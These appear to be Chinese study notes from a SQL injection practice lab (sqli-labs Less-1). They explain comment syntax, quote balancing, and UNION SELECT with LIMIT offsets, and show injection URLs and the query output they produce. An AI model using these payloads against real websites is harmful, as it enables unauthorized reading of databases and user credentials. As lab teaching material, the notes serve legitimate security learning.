```sql
SELECT * FROM users WHERE id='1' and 1=2 '' LIMIT 0,1 -- 错误
/*这两个连续的''在此是不合法的，它无法被解析，正确的命令应该是再加一个and，他就可以被解析*/
SELECT * FROM users WHERE id='1' and 1=2 and '' LIMIT 0,1 --正确
```

```sql
/*--作为注释符时，后边需要加任意空格和一个任意字符才可以作注释，而浏览器往往在传参的时候会忽略这个空格，因此--作为注释符被sql解析*/
-- 这是正确的
http://192.168.6.171:81/Less-1/?id=1' and 1=2 -- q
-- 这是错误的
http://192.168.6.171:81/Less-1/?id=1' and 1=2 --q
http://192.168.6.171:81/Less-1/?id=1' and 1=2 --_(_代表一个空格)
```

```sql
SELECT * FROM users WHERE id=1 union select 1,2,3;
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | Dumb     | Dumb     |
|  1 | 2        | 3        |
+----+----------+----------+
-- 联合查询在sql中的结果是返回原始查询和联合查询共同的结果集。

/*但是在浏览器中回显的时候一般要看后端脚本怎么将结果回显到浏览器上，一般都只会通过$row = mysql_fetch_array($result)函数返回结果集的第一个结果，即DUMB和DUMB，而不是DUMB2和DUMB3。*/

mysql> SELECT * FROM users WHERE id=1 union select 1,2,3 LIMIT 1,1;
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | 2        | 3        |
+----+----------+----------+
-- 但是可以通过LIMIT a,b来限制结果集结果，其中a代表偏移量，b代表显示几行，最后将显示原先结果集中第a行以后的共b行结果。
```



sql中字符串必须用''框起来

uniont select前后是两个逻辑，他们之间没有与或非的关系

```sql
SELECT * FROM users WHERE id=1 and 1=2 union select 1,2,3;
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | 2        | 3        |
+----+----------+----------+
-- 这里id=1虽然存在但是由于和1=2进行了and，所以没有id=1的结果
SELECT * FROM users WHERE id=1 union select 1,2,3;
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | Dumb     | Dumb     |
|  1 | 2        | 3        |
+----+----------+----------+
-- 这里没有用and因为有id=1的结果
```



